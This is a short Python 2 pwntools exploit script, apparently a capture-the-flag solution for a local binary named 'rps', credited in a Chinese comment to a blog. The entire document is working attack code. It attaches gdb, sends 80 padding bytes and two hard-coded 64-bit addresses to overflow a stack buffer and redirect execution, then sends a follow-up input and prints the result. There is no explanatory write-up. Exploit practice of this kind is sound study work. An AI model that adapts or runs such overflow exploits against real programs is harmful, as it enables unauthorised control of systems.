#借鉴于‘简单而快乐’的博客
from pwn import *
import time,sys,binascii

elf_name = "./rps"
elf = ELF(elf_name)
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')

io = process( elf_name )
gdb.attach(io, "b *0x0000000000400874")

addr1=0x00000000006010e8
addr2=0x00000000004008b4

payload = "A" * 80
payload += p64(addr1)
payload += p64(addr2)

data = io.recvuntil(':')
print data
io.sendline(payload)
data = io.recvlines(2)
print data
io.sendline("I")
data = io.recvall()
print data
